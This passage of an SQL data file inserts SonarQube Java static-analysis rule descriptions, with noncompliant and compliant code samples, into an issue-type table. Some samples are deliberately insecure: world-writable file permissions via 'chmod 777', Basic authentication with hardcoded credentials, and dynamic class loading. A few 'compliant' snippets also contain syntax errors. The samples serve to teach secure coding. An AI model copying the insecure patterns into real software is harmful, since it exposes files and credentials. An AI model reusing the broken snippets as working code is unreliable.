  // Print something
}
</pre>
<ul>
  <li> When the condition is literally <code>true</code> or <code>false</code>. </li>
</ul>
<pre>
if (true) {
  // do something
}
</pre>
<p>In these cases it is obvious the code is as intended.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2589', 'Boolean expressions should not be gratuitous', 'sonarqube', 'Code Smell', '<p>If a boolean expression doesn''t change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer''s intent, then it''s a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; "a" is always "true"
  doSomething();
}

if (c || !a) { // Noncompliant; "!a" is always "false"
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2612', 'Setting loose POSIX file permissions is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>In Unix, "<code>others</code>" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>
<p>Granting permissions to this group can lead to unintended access to files. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<pre>
    public void setPermissions(String filePath) {
        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions
        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive
        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive
        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<pre>
    public void setPermissionsUsingRuntimeExec(String filePath) {
        Runtime.getRuntime().exec("chmod 777 file.json"); // Sensitive
    }
</pre>
<pre>
    public void setOthersPermissionsHardCoded(String filePath ) {
        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString("rwxrwxrwx")); // Sensitive
    }
</pre>
<h2>Compliant Solution</h2>
<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>
<pre>
    public void setPermissionsSafe(String filePath) throws IOException {
        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();
        // user permission
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        // group permissions
        perms.add(PosixFilePermission.GROUP_READ);
        perms.add(PosixFilePermission.GROUP_EXECUTE);
        // others permissions removed
        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant
        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant
        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant

        Files.setPosixFilePermissions(Paths.get(filePath), perms);
    }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/index.php/Test_File_Permission_(OTG-CONFIG-009)">OWASP File Permission</a> </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/732">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/266.html">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions">CERT, FIO01-J.</a> -
  Create files with appropriate access permissions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions">CERT, FIO06-C.</a> - Create
  files with appropriate access permissions </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2629', '"Preconditions" and logging arguments should not require evaluation', 'sonarqube', 'Code Smell', '<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a
performance penalty. That''s because whether or not they''re needed, each argument must be resolved before the method is actually called.</p>
<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed
every time the method is called, whether or not the log level is low enough to show the message.</p>
<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging
calls.</p>
<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,
then <code>Preconditions</code> should be skipped altogether, and the relevant exception should be conditionally thrown instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
logger.log(Level.DEBUG, "Something went wrong: " + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages

logger.fine("An exception occurred with message: " + message); // Noncompliant

LOG.error("Unable to open file " + csvPath, e);  // Noncompliant

Preconditions.checkState(a &gt; 0, "Arg must be positive, but got " + a);  // Noncompliant. String concatenation performed even when a &gt; 0

Preconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition

Preconditions.checkState(condition, "message: %s", formatMessage());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log(Level.SEVERE, "Something went wrong: {0} ", message);  // String formatting only applied if needed

logger.fine("An exception occurred with message: {}", message);  // SLF4J, Log4j

logger.log(Level.SEVERE, () -&gt; "Something went wrong: " + message); // since Java 8, we can use Supplier , which will be evaluated lazily

LOG.error("Unable to open file {0}", csvPath, e);

if (LOG.isDebugEnabled() {
  LOG.debug("Unable to open file " + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.
}

Preconditions.checkState(arg &gt; 0, "Arg must be positive, but got %d", a);  // String formatting only applied if needed

if (!condition) {
  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally
}

if (!condition) {
  throw new IllegalStateException("message: " + formatMessage());
}
</pre>
<h2>Exceptions</h2>
<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of
standard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for
explicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2637', '"@NonNull" values should not be set to null', 'sonarqube', 'Bug', '<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null
values and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field
in a constructor, could cause <code>NullPointerException</code>s at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MainClass {

  @Nonnull
  private String primary;
  private String secondary;

  public MainClass(String color) {
    if (color != null) {
      secondary = null;
    }
    primary = color;  // Noncompliant; "primary" is Nonnull but could be set to null here
  }

  public MainClass() { // Noncompliant; "primary" Nonnull" but is not initialized
  }

  @Nonnull
  public String indirectMix() {
    String mix = null;
    return mix;  // Noncompliant; return value is Nonnull, but null is returned.}}
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aDdGBQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2638', 'Method overrides should not change contracts', 'sonarqube', 'Code Smell', '<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the
superclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are
marked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and
<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {

  private Season ripe;
  private String color;

  public void setRipe(@Nullable Season ripe) {
    this.ripe = ripe;
  }

  public @NotNull Integer getProtein() {
    return 12;
  }
}

public class Raspberry extends Fruit {

  public void setRipe(@NotNull Season ripe) {  // Noncompliant
    this.ripe = ripe;
  }

  public @Nullable Integer getProtein() {  // Noncompliant
    return null;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Liskov_substitution_principle">Wikipedia - Liskov substitution principle</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2639', 'Inappropriate regular expressions should not be used', 'sonarqube', 'Bug', '<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>
<p>The following should not be used as regular expressions:</p>
<ul>
  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>
  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>
  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "/File|Name.txt";

String clean = str.replaceAll(".",""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string
String clean2 = str.replaceAll("|","_"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_
String clean3 = str.replaceAll(File.separator,""); // Noncompliant; exception on Windows

String clean4 = str.replaceFirst(".",""); // Noncompliant;
String clean5 = str.replaceFirst("|","_"); // Noncompliant;
String clean6 = str.replaceFirst(File.separator,""); // Noncompliant;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2647', 'Basic authentication should not be used', 'sonarqube', 'Vulnerability', '<p>Basic authentication''s only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Using HttpPost from Apache HttpClient
String encoding = Base64Encoder.encode ("login:passwd");
org.apache.http.client.methods.HttpPost httppost = new HttpPost(url);
httppost.setHeader("Authorization", "Basic " + encoding);  // Noncompliant

or

// Using HttpURLConnection
String encoding = Base64.getEncoder().encodeToString(("login:passwd").getBytes(‌"UTF‌​-8"​));
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.setRequestProperty("Authorization", "Basic " + encoding); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication">OWASP Web Service Security
  Cheat Sheet</a> </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/522">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2653', 'Web applications should not have a "main" method', 'sonarqube', 'Vulnerability', '<p>There is no reason to have a <code>main</code> method in a web application. It may have been useful for debugging during application development,
but such a method should never make it into production. Having a <code>main</code> method in a web application opens a door to the application logic
that an attacker may never be able to reach (but watch out if one does!), but it is a sloppy practice and indicates that other problems may be
present.</p>
<p>This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
    if (userIsAuthorized(req)) {
      updatePrices(req);
    }
  }

  public static void main(String[] args) { // Noncompliant
    updatePrices(req);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/qzVGBQ">CERT, ENV06-J.</a> - Production code must not contain debugging entry points </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2658', 'Classes should not be loaded dynamically', 'sonarqube', 'Vulnerability', '<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn''t even have to instantiate or
explicitly invoke methods on such classes to be vulnerable to an attack.</p>
<p>This rule raises an issue for each use of dynamic class loading.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String className = System.getProperty("messageClassName");
Class clazz = Class.forName(className);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/470.html">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  (''Unsafe Reflection'') </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2674', 'The value returned from a stream read should be checked', 'sonarqube', 'Bug', '<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value
returned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>
<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned
from the method.</p>
<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not
checked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child
classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    is.read(buffer);  // Noncompliant
    // ...
  } catch (IOException e) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String fileName) {
  try {
    InputStream is = new InputStream(file);
    byte [] buffer = new byte[1000];
    int count = 0;
    while (count = is.read(buffer) &gt; 0) {
      // ...
    }
  } catch (IOException e) { ... }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/VzdGBQ">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an array </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2675', '"readObject" should not be "synchronized"', 'sonarqube', 'Code Smell', '<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file. It should be
the case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method, and the
<code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing. If this is not the case, the method
should be refactored to make it the case.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private synchronized void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Compliant
  //...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2676', 'Neither "Math.abs" nor negation should be used on numbers that could be "MIN_VALUE"', 'sonarqube', 'Bug', '<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you''ll
still have a negative number. Since your code is likely to assume that it''s a positive value instead, your results will be unreliable.</p>
<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object''s <code>compareTo</code> method, and
<code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods
is similarly ill-advised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String str) {
  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String str) {
  if (str.hashCode() != 0) {
    // ...
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2677', '"read" and "readLine" return values should be used', 'sonarqube', 'Bug', '<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of
action is surely a bug.</p>
<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>,
<code>Reader.read()</code>, and these methods in any child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    while (buffReader.readLine() != null) { // Noncompliant
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    String line = null;
    while ((line = buffReader.readLine()) != null) {
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2681', 'Multiline blocks should be enclosed in curly braces', 'sonarqube', 'Code Smell', '<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs.</p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<p>Note that this rule considers tab characters to be equivalent to 1 space. If you mix spaces and tabs you will sometimes see issues in code which
look fine in your editor but are confusing when you change the size of tabs.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if (condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

if (condition); secondAction();  // Noncompliant; secondAction executed unconditionally

String str = null;
for (int i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/MzZGBQ">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2689', 'Files opened in append mode should not be used with ObjectOutputStream', 'sonarqube', 'Bug', '<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization
stream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>
constructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>
<p>When you''re trying to read your object(s) back from the file, only the first one will be read successfully, and a
<code>StreamCorruptedException</code> will be thrown after that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode
ObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName);
ObjectOutputStream out = new ObjectOutputStream(fos);
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2692', '"indexOf" checks should not be for positive numbers', 'sonarqube', 'Code Smell', '<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the
first element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider
using the <code>contains</code> method instead.</p>
<p>This rule raises an issue when an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested against
<code>&gt;0</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; 0) {  // Noncompliant
  // ...
}
if (name.indexOf("ish") &gt; 0) { // Noncompliant
  // ...
}
if (name.indexOf("ae") &gt; 0) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; -1) {
  // ...
}
if (name.indexOf("ish") &gt;= 0) {
  // ...
}
if (name.contains("ae") {
  // ...
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2693', 'Threads should not be started in constructors', 'sonarqube', 'Code Smell', '<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you''ll have a confusing mess on your hands if the class is ever
extended because the superclass'' constructor will start the thread before the child class has truly been initialized.</p>
<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  Thread thread = null;

  public MyClass(Runnable runnable) {
    thread = new Thread(runnable);
    thread.start(); // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/FDdGBQ">CERT, TSM02-J.</a> - Do not use background threads during class initialization </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2694', 'Inner classes which do not reference their owning classes should be "static"', 'sonarqube', 'Code Smell', '<p>A non-static inner class has a reference to its outer class, and access to the outer class'' fields and methods. That class reference makes the
inner class larger and could cause the outer class instance to live in memory longer than necessary. </p>
<p>If the reference to the outer class isn''t used, it is more efficient to make the inner class <code>static</code> (also called nested). If the
reference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will
also be necessary to name it. </p>
<p>However, while a nested/<code>static</code> class would be more efficient, it''s worth noting that there are semantic differences between an inner
class and a nested one:</p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  // ...

  public class Seed {  // Noncompliant; there''s no use of the outer class reference so make it static
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  // ...

  public static class Seed {
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2695', '"PreparedStatement" and "ResultSet" methods should be called with valid indices', 'sonarqube', 'Bug', '<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any "set" method of a <code>PreparedStatement</code> with a
number less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1,
rather than 0</p>
<h2>Noncompliant Code Example</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(0, date);  // Noncompliant
ps.setDouble(3, salary);  // Noncompliant

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(0);  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(1, date);
ps.setDouble(2, salary);

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(1);
  // ...
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2696', 'Instance methods should not write to "static" fields', 'sonarqube', 'Code Smell', '<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple
class instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>
methods.</p>
<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  private static int count = 0;

  public void doSomething() {
    //...
    count++;  // Noncompliant
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2698', 'Test assertions should include messages', 'sonarqube', 'Code Smell', '<p>Adding messages to JUnit, FEST and AssertJ assertions is an investment in your future productivity. Spend a few seconds writing them now, and
you''ll save a lot of time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the
tests and the assertion messages work as a sort of documentation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
assertEquals(4, list.size());  // Noncompliant

try {
  fail();  // Noncompliant
} catch (Exception e) {
  assertThat(list.get(0)).isEqualTo("pear");  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
assertEquals("There should have been 4 Fruits in the list", 4, list.size());

try {
  fail("And exception is expected here");
} catch (Exception e) {
  assertThat(list.get(0)).as("check first element").overridingErrorMessage("The first element should be a pear, not a %s", list.get(0)).isEqualTo("pear");
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2699', 'Tests should include assertions', 'sonarqube', 'Code Smell', '<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>
<ul>
  <li> AssertJ </li>
  <li> Awaitility </li>
  <li> EasyMock </li>
  <li> Eclipse Vert.x </li>
  <li> Fest 1.x and 2.x </li>
  <li> Hamcrest </li>
  <li> JMock </li>
  <li> JMockit </li>
  <li> JUnit </li>
  <li> Mockito </li>
  <li> Rest-assured 2.x, 3.x and 4.x </li>
  <li> RxJava 1.x and 2.x </li>
  <li> Selenide </li>
  <li> Spring''s <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>
  <li> Truth Framework </li>
  <li> WireMock </li>
</ul>
<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be
considered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format
